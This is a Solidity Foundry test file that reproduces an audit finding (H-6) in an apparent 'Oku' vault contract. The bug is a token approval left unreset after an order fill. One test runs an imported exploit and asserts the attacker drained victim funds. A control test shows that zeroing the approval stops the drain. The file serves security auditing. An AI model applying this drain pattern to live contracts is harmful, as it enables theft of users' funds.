// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./44376-h-6-failure-to-reset-unspent-approval-to-the-target-address.sol";

/*//////////////////////////////////////////////////////////////
    Oku — unspent approval wipe (H-6, #44376)

    - test_exploit: drives the cheatcode-free Exploit end to end and
      re-asserts the attacker drained the vault's pending-order inventory.
    - test_control_resetPreventsDrain: control — if approval is reset to 0
      after the fill call, residual allowance is 0 and drain reverts.
//////////////////////////////////////////////////////////////*/
contract OkuUnspentApprovalTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        // Re-assert HARM: attacker holds (nearly) the victim inventory + their refund.
        uint256 stolen = e.tokenIn().balanceOf(address(e.attacker()));
        assertGe(stolen, e.VICTIM_AMOUNT() - 2, "attacker drained victim inventory");
        // Vault inventory of tokenIn should be nearly empty (maybe dust).
        assertLe(e.tokenIn().balanceOf(address(e.oracleLess())), 1, "vault wiped");
    }

    function test_control_resetPreventsDrain() public {
        // Standalone rebuild: after execute-equivalent call, explicitly zero approval.
        MockToken tokenIn = new MockToken();
        MockToken tokenOut = new MockToken();
        OracleLess vault = new OracleLess();
        MaliciousTarget mal = new MaliciousTarget(IERC20(address(tokenIn)), IERC20(address(tokenOut)));

        tokenIn.mint(address(this), 200 ether);
        tokenOut.mint(address(mal), 1);

        // Victim inventory
        tokenIn.approve(address(vault), 100 ether);
        vault.createOrder(IERC20(address(tokenIn)), IERC20(address(tokenIn)), 100 ether, 9 ether, address(0xA11CE));

        // Attacker order + fill
        tokenIn.approve(address(vault), 100 ether);
        uint96 oid = vault.createOrder(IERC20(address(tokenIn)), IERC20(address(tokenOut)), 100 ether, 0, address(this));
        vault.fillOrder(oid, address(mal), "");

        // CONTROL FIX: zero the residual approval (what the real fix does).
        tokenIn.approve(address(mal), 0);
        // But the residual is on the VAULT, not on this contract — so simulate the
        // vault resetting: we call through a one-shot that mirrors the fix path by
        // having the vault itself approve 0. Since vault has no such helper, we
        // use vm.prank as the vault to set allowance to 0.
        vm.prank(address(vault));
        tokenIn.approve(address(mal), 0);

        assertEq(tokenIn.allowance(address(vault), address(mal)), 0, "approval wiped");
        vm.expectRevert();
        mal.spendAllowance(address(vault), address(this), 1 ether);
    }
}
